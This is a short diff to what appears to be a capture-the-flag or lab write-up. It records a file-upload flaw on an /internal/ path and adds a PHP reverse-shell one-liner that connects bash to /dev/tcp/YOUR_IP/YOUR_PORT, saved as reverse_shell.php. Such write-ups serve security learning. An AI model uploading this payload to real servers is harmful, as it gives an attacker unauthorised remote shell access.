@@ -15,3 +15,13 @@ The */internal/* path is vulnerable to **File Upload**
 ![[Pasted image 20250807130951.png]]
 
 
+# Getting the reverse shell
+
+```json
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'");
+?>
+```
+
+Then i have saved this command to the following file: *reverse_shell.php*.
+
